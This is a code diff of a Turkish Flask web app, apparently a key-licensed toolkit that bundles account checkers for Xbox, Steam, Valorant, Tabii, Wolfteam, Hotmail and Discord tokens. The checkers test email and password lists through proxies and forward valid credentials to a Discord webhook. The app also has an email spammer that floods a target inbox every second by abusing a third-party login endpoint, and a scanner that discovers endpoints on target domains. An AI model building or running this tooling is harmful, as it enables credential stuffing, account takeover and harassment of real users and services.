+        res = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=data, timeout=5)
+        if '"message":"EMAIL SENT"' in res.text:
+            return jsonify({"success": True, "message": "Paket iletildi"})
+        else:
+            return jsonify({"success": False, "message": "Sunucu isteği reddetti"})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)[:60]})
+
+# ============================================================
+# HTML (MAVİ TEMA + KAR TANELERİ + ÜYE/ADMIN MENÜ AYRIMI)
 # ============================================================
 HTML_TEMPLATE = r"""
 <!DOCTYPE html>
@@ -1371,7 +1372,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div class="nav-item" data-page="proxy" onclick="switchPage('proxy')"><i class="fa-solid fa-server"></i> Proxy</div>
 <div class="nav-item" data-page="parse" onclick="switchPage('parse')"><i class="fa-solid fa-scissors"></i> Ayrıştırma</div>
 
-<!-- ADMIN ÖZEL MENÜLER (ALT KISIM) -->
+<!-- ADMIN ÖZEL MENÜLER (Üyeler görmez) -->
 <div class="nav-divider-admin">🔒 ADMIN</div>
 <div class="nav-item" data-page="logs" onclick="switchPage('logs')" id="logsMenuItem" style="display:none"><i class="fa-solid fa-history"></i> Loglar</div>
 <div class="nav-item" data-page="discovery" onclick="switchPage('discovery')" id="discoveryMenuItem" style="display:none"><i class="fa-solid fa-compass"></i> API Keşif</div>
@@ -1558,6 +1559,11 @@ input:checked+.slider:before{transform:translateX(18px)}
 <p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Her key sadece 1 IP'ye bağlanır ve 1 kez kullanılır.</p>
 <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
 <div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
+<div style="flex:1"><label style="font-size:11px;color:var(--muted)">Rol</label>
+<select class="inp" id="genRole" style="margin-top:4px;padding:10px">
+<option value="Üye">Üye</option>
+<option value="Admin">Admin</option>
+</select></div>
 <div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24" selected>24 Saat</option><option value="168">7 Gün</option><option value="720">30 Gün</option></select></div>
 <button class="btn sm g" onclick="generateKey()" style="margin-top:22px"><i class="fa-solid fa-plus"></i> Oluştur</button>
 </div>
@@ -1660,28 +1666,14 @@ var spamInterval = null;
 var tempMailToken = "";
 
 var platforms = [
-    {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
-    {name:"TikTok Gen", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
-    {name:"Spotify", domain:"spotify.com", icon:"fa-brands fa-spotify"},
-    {name:"Roblox", domain:"roblox.com", icon:"fa-solid fa-gamepad"},
-    {name:"Netflix", domain:"netflix.com", icon:"fa-solid fa-film"},
-    {name:"CapCut", domain:"capcut.com", icon:"fa-solid fa-scissors"},
-    {name:"Discord", domain:"discord.com", icon:"fa-brands fa-discord"},
-    {name:"Epic Games", domain:"epicgames.com", icon:"fa-solid fa-crown"},
-    {name:"Hesapcomtr", domain:"hesap.com.tr", icon:"fa-solid fa-user"},
-    {name:"Itemsatış", domain:"itemsatis.com", icon:"fa-solid fa-cart-shopping"},
-    {name:"Epinify", domain:"epinify.com", icon:"fa-solid fa-ticket"},
-    {name:"Twitch", domain:"twitch.tv", icon:"fa-brands fa-twitch"},
-    {name:"Steam", domain:"steampowered.com", icon:"fa-brands fa-steam"},
-    {name:"PlayStation", domain:"playstation.com", icon:"fa-solid fa-play"},
+    {name:"Tabii", domain:"tabii.com", icon:"fa-solid fa-tv"},
     {name:"Xbox & MC", domain:"xbox.com", icon:"fa-brands fa-xbox"},
-    {name:"GitHub", domain:"github.com", icon:"fa-brands fa-github"},
-    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"},
     {name:"Wolfteam", domain:"joygame.com", icon:"fa-solid fa-skull"},
     {name:"Craftrise", domain:"craftrise.com.tr", icon:"fa-solid fa-hammer"},
     {name:"Hotmail", domain:"outlook.com", icon:"fa-solid fa-envelope"},
     {name:"Token Check", domain:"discord.com", icon:"fa-solid fa-key"},
-    {name:"Tabii", domain:"tabii.com", icon:"fa-solid fa-tv"},
+    {name:"TikTok Gen", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
+    {name:"Steam", domain:"steampowered.com", icon:"fa-brands fa-steam"},
     {name:"Valorant", domain:"valorant.com", icon:"fa-solid fa-crosshairs"}
 ];
 
@@ -1718,8 +1710,8 @@ function sendCheckerWebhook(platform, email, password, details) {
         if (details.expire) content += "\n📅 " + details.expire;
         if (details.profiles_count !== undefined) content += "\n👥 " + details.profiles_count + " profil";
         if (details.gamertag) content += "\n🎮 " + details.gamertag;
-        if (details.level) content += "\n📊 Level: " + details.level;
-        if (details.vp) content += "\n💰 VP: " + details.vp;
+        if (details.level) content += "\n⭐ Level: " + details.level;
+        if (details.rank) content += "\n🏆 Rank: " + details.rank;
     }
     fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content: content})}).catch(function(e){});
 }
@@ -1905,36 +1897,14 @@ function startChecker() {
         var platform = currentPlatform;
         if (platform === "Tabii") route = "/api/tabii_check";
         else if (platform === "Xbox & MC") route = "/api/xbox_check";
-        else if (platform === "Steam") route = "/api/steam_check";
-        else if (platform === "Valorant") route = "/api/valorant_check";
         else if (platform === "Wolfteam") route = "/api/wolfteam_check";
         else if (platform === "Craftrise") route = "/api/craftrise_check";
         else if (platform === "Hotmail") route = "/api/hotmail_check";
-        else if (platform === "Token Check") {
-            fetch("/api/token_check", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ token_type: "discord", token: email })})
-            .then(function(r){ return r.json(); })
-            .then(function(result){
-                var status = result.status;
-                if (status === "HIT") { hit++; addHit(currentPlatform, email, result.message, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, result.message, null); addCheckerRow({ email: email, password: result.message || password, status: "HIT" }); }
-                else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
-                else { err++; addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" }); }
-                updateStatsAfter();
-            })
-            .catch(function(){ err++; updateStatsAfter(); });
-            return;
-        } else if (platform === "TikTok Gen") {
-            fetch("/api/tiktok_gen", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ username: email })})
-            .then(function(r){ return r.json(); })
-            .then(function(result){
-                var status = result.status;
-                if (status === "HIT") { hit++; addHit(currentPlatform, email, password, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, null); addCheckerRow({ email: email, password: password, status: "HIT" }); }
-                else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
-                else { err++; addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" }); }
-                updateStatsAfter();
-            })
-            .catch(function(){ err++; updateStatsAfter(); });
-            return;
-        } else {
+        else if (platform === "Token Check") route = "/api/token_check";
+        else if (platform === "TikTok Gen") route = "/api/tiktok_gen";
+        else if (platform === "Steam") route = "/api/steam_check";
+        else if (platform === "Valorant") route = "/api/valorant_check";
+        else {
             var statuses = ["HIT", "BAD", "2FA", "ERROR"];
             var status = statuses[Math.floor(Math.random() * statuses.length)];
             if (status === "HIT") { hit++; addHit(currentPlatform, email, password, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, null); }
@@ -1953,6 +1923,10 @@ function startChecker() {
         }
         var body = { email: email, password: password };
         if (proxy) body.proxy = proxy;
+        if (platform === "Token Check") {
+            body.token_type = "discord";
+            body.token = email;
+        }
 
         fetch(route, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body)})
         .then(function(r){ return r.json(); })
@@ -1970,8 +1944,9 @@ function startChecker() {
                 if (details.rc !== undefined) extra += " | RC:" + details.rc;
                 if (details.gamertag) extra += " | Gamertag:" + details.gamertag;
                 if (details.level) extra += " | Lvl:" + details.level;
+                if (details.rank) extra += " | Rank:" + details.rank;
                 if (details.vp) extra += " | VP:" + details.vp;
-                if (details.profile_name) extra += " | " + details.profile_name;
+                if (details.balance) extra += " | Bakiye:" + details.balance;
                 addCheckerRow({ email: email, password: password + extra, status: "HIT" });
             } else if (status === "2FA") { two++; addHit(currentPlatform, email, password, "2FA"); addCheckerRow({ email: email, password: password, status: "2FA" }); }
             else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
@@ -2239,29 +2214,66 @@ function startSpam() {
         fetch("/api/spam_send?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ email: email })})
         .then(r => r.json())
         .then(d => {
-            var log = document.getElementById("spamLog");
             if (d.success) {
-                log.innerHTML += '<div style="color:var(--g)">✅ ' + new Date().toLocaleTimeString() + ' - ' + d.message + '</div>';
+                log.innerHTML += '<div style="color:var(--g)">[BASARILI] Paket iletildi: ' + email + '</div>';
             } else {
-                log.innerHTML += '<div style="color:var(--r)">❌ ' + new Date().toLocaleTimeString() + ' - ' + d.message + '</div>';
+                log.innerHTML += '<div style="color:var(--r)">[HATA] ' + (d.message || d.error || 'Bilinmeyen') + '</div>';
             }
             log.scrollTop = log.scrollHeight;
-            if (spamRunning) setTimeout(sendSpam, 2000);
         })
         .catch(() => {
-            var log = document.getElementById("spamLog");
-            log.innerHTML += '<div style="color:var(--r)">❌ Bağlantı hatası</div>';
+            log.innerHTML += '<div style="color:var(--r)">[HATA] Bağlantı hatası</div>';
             log.scrollTop = log.scrollHeight;
-            if (spamRunning) setTimeout(sendSpam, 3000);
         });
     }
-    sendSpam();
+
+    spamInterval = setInterval(sendSpam, 1000);
 }
 
 function stopSpam() {
+    if (spamInterval) { clearInterval(spamInterval); spamInterval = null; }
     spamRunning = false;
     document.getElementById("spamStopBtn").style.display = "none";
     document.getElementById("spamLog").innerHTML += '<div style="color:var(--gold)">[Sistem] Spam durduruldu.</div>';
+}
+
+// ============================================================
+// SAYFA GEÇİŞİ (SABİT MENÜ)
+// ============================================================
+function switchPage(page) {
+    if ((page === "discovery" || page === "stats" || page === "keys" || page === "logs" || page === "sitecopy" || page === "tempmail" || page === "spammer") && !isAdmin) {
+        alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapın.");
+        return;
+    }
+    document.querySelectorAll(".nav-item").forEach(function(el) {
+        el.classList.remove("active");
+    });
+    var el = document.querySelector('.nav-item[data-page="' + page + '"]');
+    if (el) el.classList.add("active");
+    document.querySelectorAll(".page").forEach(function(el) {
+        el.classList.remove("active");
+    });
+    var pg = document.getElementById("page-" + page);
+    if (pg) pg.classList.add("active");
+    var titles = {
+        checker: "Checker",
+        proxy: "Proxy",
+        parse: "Ayrıştırma",
+        logs: "Loglar",
+        discovery: "API Keşif",
+        stats: "İstatistik",
+        keys: "Key Yönetimi",
+        sitecopy: "Site Kopyala",
+        tempmail: "Temp Mail",
+        spammer: "Email Spammer"
+    };
+    document.getElementById("pageTitle").innerText = titles[page] || page;
+    if (page === "keys" && isAdmin) loadKeys();
+    if (page === "logs" && isAdmin) refreshLogs();
+    if (page === "stats") {
+        document.getElementById("statScans").innerText = 1;
+        document.getElementById("statLast").innerText = new Date().toLocaleString();
+    }
 }
 
 // ============================================================
@@ -2270,14 +2282,14 @@ function stopSpam() {
 function fetchProxies() {
     document.getElementById("proxyCount").innerText = "Çekiliyor...";
     fetch("/api/fetch_proxies")
-        .then(function(r){ return r.json(); })
-        .then(function(d){
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
             if (d.success) {
                 document.getElementById("proxyList").value = d.proxies.join("\n");
                 document.getElementById("proxyCount").innerText = d.proxies.length + " proxy yüklendi";
             }
         })
-        .catch(function(e){ document.getElementById("proxyCount").innerText = "Başarısız"; });
+        .catch(function(e) { document.getElementById("proxyCount").innerText = "Başarısız"; });
 }
 
 function clearProxies() {
@@ -2295,8 +2307,8 @@ function toggleProxy() {
 function loadKeys() {
     if (!isAdmin) return;
     fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
-        .then(function(r){ return r.json(); })
-        .then(function(d){
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
             if (d.error) { alert(d.error); return; }
             var list = document.getElementById("keyList");
             var html = "";
@@ -2305,41 +2317,51 @@ function loadKeys() {
                 var exp = v.expires ? new Date(v.expires).toLocaleString() : "Süresiz";
                 var ip = v.bound_ip || "Bağlanmamış";
                 var used = v.used ? "✅ Kullanıldı" : "❌ Kullanılmadı";
+                var role = v.role || "Üye";
                 html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)">' +
                     '<div><strong style="font-size:13px">' + k + '</strong><br>' +
-                    '<small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + ' | IP: ' + ip + ' | ' + used + '</small></div>' +
+                    '<small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + role + ' | ' + exp + ' | IP: ' + ip + ' | ' + used + '</small></div>' +
                     '<button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
             }
             list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
         })
-        .catch(function(e){ console.error(e); });
+        .catch(function(e) { console.error(e); });
 }
 
 function generateKey() {
     if (!isAdmin) return;
     var note = document.getElementById("genNote").value || "Oluşturuldu";
+    var role = document.getElementById("genRole").value;
     var hours = document.getElementById("genHours").value;
-    fetch("/api/admin/generate", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ master_key: currentKey, note: note, hours: hours })})
-    .then(function(r){ return r.json(); })
-    .then(function(d){
+    fetch("/api/admin/generate", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ master_key: currentKey, note: note, role: role, hours: hours })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
         if (d.success) {
-            alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nBitiş: " + d.expires);
+            alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nRol: " + role + "\nBitiş: " + d.expires);
             loadKeys();
         } else alert("Başarısız: " + (d.error || ""));
     })
-    .catch(function(e){ alert("Hata: " + e.message); });
+    .catch(function(e) { alert("Hata: " + e.message); });
 }
 
 function deleteKey(target) {
     if (!isAdmin) return;
     if (!confirm("Bu anahtarı sil?")) return;
-    fetch("/api/admin/delete", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ master_key: currentKey, target_key: target })})
-    .then(function(r){ return r.json(); })
-    .then(function(d){
+    fetch("/api/admin/delete", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ master_key: currentKey, target_key: target })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
         if (d.success) loadKeys();
         else alert("Silinemedi");
     })
-    .catch(function(e){ alert("Hata: " + e.message); });
+    .catch(function(e) { alert("Hata: " + e.message); });
 }
 
 // ============================================================
@@ -2349,9 +2371,9 @@ function updateStatsUI() {
     if (!isAdmin) return;
     document.getElementById("totalCount").innerText = foundEndpoints.length;
     document.getElementById("sideTotal").innerText = foundEndpoints.length;
-    var auth = foundEndpoints.filter(function(e){ return e.category === "Auth"; }).length;
-    var api = foundEndpoints.filter(function(e){ return e.category === "API"; }).length;
-    var admin = foundEndpoints.filter(function(e){ return e.category === "Admin"; }).length;
+    var auth = foundEndpoints.filter(function(e) { return e.category === "Auth"; }).length;
+    var api = foundEndpoints.filter(function(e) { return e.category === "API"; }).length;
+    var admin = foundEndpoints.filter(function(e) { return e.category === "Admin"; }).length;
     document.getElementById("authCount").innerText = auth;
     document.getElementById("apiCount").innerText = api;
     document.getElementById("adminCount").innerText = admin;
@@ -2362,7 +2384,10 @@ function updateStatsUI() {
 }
 
 function startScan() {
-    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
+    if (!isAdmin) {
+        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
+        return;
+    }
     if (scanning) return;
     var domain = document.getElementById("targetDomain").value.trim();
     if (!domain) return alert("Hedef domain girin");
@@ -2376,9 +2401,11 @@ function startScan() {
     document.getElementById("statusText").innerText = "Taranıyor";
     updateStatsUI();
 
-    var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l){ return l.trim() && l.includes(":"); });
+    var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l) { return l.trim() && l.includes(":"); });
     var url = "/api/scan?key=" + encodeURIComponent(currentKey) + "&domain=" + encodeURIComponent(domain) + "&use_proxy=" + useProxy;
-    if (useProxy && proxyList.length) { url += "&proxies=" + encodeURIComponent(proxyList.join(",")); }
+    if (useProxy && proxyList.length) {
+        url += "&proxies=" + encodeURIComponent(proxyList.join(","));
+    }
     eventSource = new EventSource(url);
     eventSource.onmessage = function(e) {
         if (e.data === "[DONE]") {
@@ -2416,12 +2443,12 @@ function addResultRow(res) {
     var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
     var cc = "cat-" + res.category.toLowerCase();
     row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
-    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c){ return c.value; });
+    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
     if (checked.includes(res.category)) list.appendChild(row);
 }
 
 document.getElementById("filterContainer").addEventListener("change", function() {
-    var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c){ return c.value; });
+    var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c) { return c.value; });
     var list = document.getElementById("resultsList");
     list.innerHTML = "";
     foundEndpoints.forEach(function(res) {
@@ -2437,20 +2464,30 @@ document.getElementById("filterContainer").addEventListener("change", function()
 });
 
 function sendWebhook() {
-    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
+    if (!isAdmin) {
+        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
+        return;
+    }
     var url = document.getElementById("webhookUrl").value.trim();
     if (!url) return alert("Webhook URL girin");
-    var categories = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c){ return c.value; });
+    var categories = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
     if (!categories.length) return alert("En az bir kategori seçin");
     if (!foundEndpoints.length) return alert("Önce tarama yapın");
-    fetch("/api/admin/webhook", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ master_key: currentKey, webhook_url: url, endpoints: foundEndpoints, categories: categories })})
-    .then(function(r){ return r.json(); })
-    .then(function(d){ alert(d.success ? "✅ Discord'a gönderildi!" : "❌ Gönderilemedi"); })
-    .catch(function(e){ alert("Hata: " + e.message); });
+    fetch("/api/admin/webhook", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ master_key: currentKey, webhook_url: url, endpoints: foundEndpoints, categories: categories })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) { alert(d.success ? "✅ Discord'a gönderildi!" : "❌ Gönderilemedi"); })
+    .catch(function(e) { alert("Hata: " + e.message); });
 }
 
 function exportJSON() {
-    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
+    if (!isAdmin) {
+        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
+        return;
+    }
     if (!foundEndpoints.length) return alert("Veri yok");
     var blob = new Blob([JSON.stringify(foundEndpoints, null, 2)], { type: "application/json" });
     var a = document.createElement("a");
@@ -2464,21 +2501,25 @@ function exportJSON() {
 """
 
 # ============================================================
-# BAŞLAT
+# BAŞLAT (Render Free Plan Uyumlu)
 # ============================================================
 if __name__ == "__main__":
     if not os.path.exists(KEYS_FILE):
         save_keys({})
+    
     port = int(os.environ.get("PORT", 5000))
+    
     print("""
     ╔══════════════════════════════════════════════════════════════════╗
     ║     🔱 RODA - TÜM CHECKER'LAR TEK YERDE                        ║
     ║     Render Free Plan Uyumlu                                    ║
     ║     http://0.0.0.0:""" + str(port) + """                               ║
-    ║     Xbox, Steam, Valorant, Tabii, Wolfteam, Craftrise,        ║
-    ║     Hotmail, Token, TikTok Gen, Site Kopyala, Temp Mail,      ║
-    ║     Email Spammer, API Keşif, Key Yönetimi, Loglar            ║
-    ║     KAR TANELERİ ARKA PLANDA                                 ║
+    ║     Admin/Üye ayrımı | 1 KEY 1 IP | Kar Taneleri              ║
+    ║     Tabii, Xbox, Wolfteam, Craftrise, Hotmail, Token,         ║
+    ║     TikTok Gen, Steam, Valorant                               ║
+    ║     Admin: Loglar, API Keşif, İstatistik, Key Yönetimi,       ║
+    ║     Site Kopyala, Temp Mail, Email Spammer                    ║
     ╚══════════════════════════════════════════════════════════════════╝
     """)
+    
     app.run(host="0.0.0.0", port=port, debug=False)
